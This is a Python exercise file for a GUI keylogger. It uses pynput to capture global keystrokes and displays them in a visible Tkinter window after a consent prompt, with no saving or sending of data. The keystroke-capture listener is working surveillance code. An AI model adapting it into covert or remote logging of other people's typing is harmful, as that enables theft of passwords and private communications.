# - Topics:
# - Create a more advanced keylogger with a graphical user interface.
# - Project:
# - Build a Python keylogger that logs keystrokes 
# - and shows the captured data in a simple GUI.



import tkinter as tk
from tkinter import scrolledtext, messagebox
from queue import Queue
from pynput import keyboard
import threading

class KeyLogger:
    def __init__(self, queue):
        self.queue = queue
        self.listener = None
        self.running = False

    def start(self):
        """Start the keylogger thread"""
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        """Stop the keylogger"""
        if self.listener:
            self.running = False
            self.listener.stop()

    def _on_press(self, key):
        """Handle key press events"""
        try:
            key_str = key.char
        except AttributeError:
            key_str = f'[{key.name}]'
        
        self.queue.put(key_str)

class KeyLoggerGUI:
    def __init__(self):
        # Initialize GUI
        self.root = tk.Tk()
        self.root.title("Keystroke Monitor - Educational Tool")
        self.root.geometry("600x400")
        
        # Security warning
        warning = "WARNING: This is a educational tool.\nDo not use without explicit permission!"
        tk.Label(self.root, text=warning, fg='red', font=('Arial', 12)).pack(pady=10)
        
        # Create text display area
        self.text_area = scrolledtext.ScrolledText(self.root, wrap=tk.WORD)
        self.text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Control buttons
        self.btn_frame = tk.Frame(self.root)
        self.btn_frame.pack(pady=5)
        
        tk.Button(self.btn_frame, text="Clear", command=self.clear_log).pack(side=tk.LEFT, padx=5)
        
        # Initialize keylogger components
        self.queue = Queue()
        self.key_logger = KeyLogger(self.queue)
        
        # Start periodic queue checking
        self.root.after(100, self.process_queue)
        
        # Start keylogger
        try:
            self.key_logger.start()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start keylogger: {str(e)}")
            self.root.destroy()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def process_queue(self):
        """Update GUI with new keystrokes"""
        while not self.queue.empty():
            key = self.queue.get()
            self.text_area.insert(tk.END, key)
            self.text_area.see(tk.END)
        self.root.after(100, self.process_queue)

    def clear_log(self):
        """Clear the display area"""
        self.text_area.delete(1.0, tk.END)

    def on_close(self):
        """Handle window close event"""
        self.key_logger.stop()
        self.root.destroy()

if __name__ == "__main__":
    # Show consent dialog
    consent = messagebox.askyesno(
        "Consent Check",
        "This educational tool will monitor your keyboard input.\n\n"
        "Do you consent to continue?",
        icon='warning'
    )
    
    if consent:
        app = KeyLoggerGUI()
        app.root.mainloop()
    else:
        print("Application closed by user consent")